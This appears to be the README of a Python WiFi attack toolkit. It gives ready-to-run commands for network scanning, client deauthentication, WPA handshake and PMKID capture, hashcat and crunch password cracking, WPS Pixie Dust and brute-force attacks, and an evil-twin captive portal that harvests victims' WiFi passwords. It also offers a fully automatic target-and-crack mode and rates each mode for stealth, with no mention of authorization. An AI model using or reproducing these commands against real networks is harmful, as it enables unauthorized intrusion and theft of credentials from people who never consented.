# WiFi Security Testing Toolkit

Production-quality WiFi security assessment toolkit. Full-chain: reconnaissance → handshake capture → cracking → exploitation.

## Architecture

```
wifi-toolkit/
├── nexus.py          # Main orchestrator (CLI)
├── monitor.py        # Interface manager + channel hopper
├── sniffer.py        # Passive AP/client scanner
├── handshake.py      # WPA handshake + PMKID capture + deauth
├── cracker.py        # PBKDF2 passphrase cracker (multiprocess)
├── wps_attack.py     # WPS PIN attack (Pixie Dust + brute force)
├── evil_twin.py      # Rogue AP + captive portal
├── wordlist_gen.py   # Targeted wordlist generator
├── requirements.txt  # Python dependencies
├── install.sh        # System dependency installer
└── nexus_output/     # Captures, hashes, scan results
```

## Requirements

- **Linux** (Kali, Ubuntu, Parrot, Arch). macOS/Windows lack monitor mode.
- WiFi adapter supporting monitor mode + packet injection (Atheros AR9271, Ralink RT3070, Realtek RTL8812AU)
- Python 3.9+

### Hardware Recommendations

| Chipset | Adapter | Injection | 5 GHz | Notes |
|---------|---------|-----------|-------|-------|
| Atheros AR9271 | Alfa AWUS036NHA | ✓ | ✗ | Gold standard for 2.4 GHz |
| Ralink RT3070 | Alfa AWUS036NH | ✓ | ✗ | Reliable, cheap |
| Realtek RTL8812AU | Alfa AWUS036ACH | ✓ | ✓ | Dual-band, excellent range |
| Realtek RTL8814AU | Alfa AWUS1900 | ✓ | ✓ | 4x4 MIMO, best range |
| MediaTek MT7612U | Alfa AWUS036ACM | ✓ | ✓ | Good dual-band budget option |

## Installation

```bash
cd wifi-toolkit
chmod +x install.sh
sudo ./install.sh
```

Or manually:

```bash
sudo apt install aircrack-ng reaver hostapd dnsmasq hashcat hcxtools  # Linux
pip install -r requirements.txt
```

## Quick Start

### 1. Scan for networks

```bash
sudo python3 nexus.py scan
```

Discovers all APs, their encryption, signal strength, and connected clients. Results saved to `nexus_output/scan_<timestamp>.json`.

### 2. Full automated attack

```bash
# Generate a wordlist first
python3 wordlist_gen.py -s "TargetWiFi" --size medium -o wordlist.txt

# Full chain: scan → select target → capture → crack
sudo python3 nexus.py full -w wordlist.txt
```

### 3. Fully automatic (no user input)

```bash
sudo python3 nexus.py auto -w wordlist.txt
```

Automatically picks the strongest WPA2 target with clients, captures the handshake, and cracks it.

### 4. Individual components

```bash
# Just scan
sudo python3 nexus.py scan -t 60

# Capture handshake for a specific AP
sudo python3 nexus.py capture AA:BB:CC:DD:EE:FF -c 6 -s "MyWiFi" -t 120

# PMKID-only capture (no deauth, silent)
sudo python3 nexus.py capture AA:BB:CC:DD:EE:FF -c 6 --pmkid

# Crack a captured hash
sudo python3 nexus.py crack -w wordlist.txt --hashcat nexus_output/capture.hc22000

# WPS attack (Pixie Dust)
sudo python3 nexus.py wps AA:BB:CC:DD:EE:FF -c 6 -s "MyWiFi"

# Evil twin (captive portal credential harvest)
sudo python3 nexus.py evil-twin "MyWiFi" -c 6
```

## Attack Workflows

### Workflow A: PMKID Attack (Preferred — no deauth)

PMKID is extracted from the AP's EAPOL frame 1. No client interaction, no deauth, completely passive.

```
1. sudo python3 nexus.py capture <BSSID> -c <CHANNEL> --pmkid
2. sudo python3 nexus.py crack -w wordlist.txt --hashcat nexus_output/<file>.hc22000
```

### Workflow B: Full 4-Way Handshake Capture

Deauths a connected client, captures their reconnection handshake.

```
1. sudo python3 nexus.py scan                     # Find target
2. sudo python3 nexus.py capture <BSSID> -c <CH>   # Wait for handshake
3. sudo python3 nexus.py crack -w wordlist.txt --hashcat nexus_output/<file>.hc22000
```

### Workflow C: WPS PIN Attack

Exploits WPS. Pixie Dust works on Broadcom/Realtek/MediaTek chipsets (seconds). Otherwise brute force (~4-10 hours).

```
sudo python3 nexus.py wps <BSSID> -c <CH>
```

### Workflow D: Evil Twin / Credential Harvest

Creates a fake AP that mimics the target. Victims connect to the rogue AP instead, see a captive portal asking for the WiFi password.

```
sudo python3 nexus.py evil-twin "TargetWiFi" -c 6
```

Requires: hostapd, dnsmasq, and ideally a second WiFi adapter for internet passthrough.

### Workflow E: Hashcat GPU Cracking (fastest)

Export to hashcat format and use GPU acceleration:

```bash
# Capture with PMKID or handshake
sudo python3 nexus.py capture <BSSID> -c <CH> --pmkid -t 30

# Crack with hashcat + GPU
hashcat -m 22000 nexus_output/<file>.hc22000 wordlist.txt -O -w 3

# With rules for more coverage
hashcat -m 22000 nexus_output/<file>.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule -O
```

## Wordlist Generation

The toolkit includes a targeted generator that produces passwords based on:

- Top WiFi passwords observed in the wild
- SSID name mutations (e.g., "MyWiFi" → "MyWiFi2025", "mywifi123")
- Keyboard walks (qwerty, 1qaz2wsx, etc.)
- ISP-specific patterns (BT, Virgin, Xfinity, Sky, etc.)
- Date/year patterns
- Phone numbers and area codes
- Common word + digit/symbol suffixes

```bash
# Small (10K), fast
python3 wordlist_gen.py -s "BT-HomeHub-ABC" --size small -o bt.txt

# Medium (100K), thorough
python3 wordlist_gen.py -s "SKY12345" --size medium -o sky.txt

# Large (1M), exhaustive
python3 wordlist_gen.py --size large -o exhaustive.txt
```

## Hashcat Rules

Combine generated wordlists with hashcat rules for orders-of-magnitude more coverage:

```bash
# Core rules
hashcat -m 22000 capture.hc22000 generated.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 capture.hc22000 generated.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
hashcat -m 22000 capture.hc22000 generated.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Generate all 8-char digit combinations and pipe
crunch 8 8 0123456789 | hashcat -m 22000 capture.hc22000 -O
```

## Modes of Operation

| Mode | Speed | Stealth | Prerequisites |
|------|-------|---------|---------------|
| PMKID capture | Instant capture | Silent | AP supports PMKID (most WPA2) |
| Handshake capture | Minutes | Deauth visible | Active client on network |
| WPS Pixie Dust | Seconds | Low-visibility | Vulnerable chipset |
| WPS Brute Force | Hours | Highly visible | WPS enabled |
| Evil Twin | Variable | Very visible | User connects to rogue AP |
| GPU cracking | Variable | Offline | Captured hash + wordlist |

## Troubleshooting

**No networks found:**
- Verify monitor mode: `iwconfig` should show `Mode:Monitor`
- Check adapter is plugged in: `lsusb`
- Try a different channel or move closer

**No handshake captured:**
- Increase capture duration (`-t 120`)
- Verify you're on the correct channel
- Ensure there's an active client on the network
- Try PMKID mode instead: `--pmkid`

**Deauth not working:**
- Test injection: `aireplay-ng --test <iface>`
- Some APs ignore broadcast deauth; target a specific client
- Try different deauth reason codes

**Permission denied:**
- Run all commands with `sudo`
- Verify the adapter isn't claimed by NetworkManager: `sudo airmon-ng check kill`

## File Formats

**hc22000** (for hashcat):
```
WPA*01*PMKID*MACAP*MACSTA*ESSID***
WPA*02*MIC*MACAP*MACSTA*ESSID*ANONCE*SNONCE*EAPOL***
```

**Scan JSON:**
```json
{
  "aps": [{"bssid": "...", "ssid": "...", "channel": 6, "rssi": -45, ...}],
  "clients": [{"mac": "...", "probed_ssids": [...]}],
  "timestamp": 1234567890
}
```
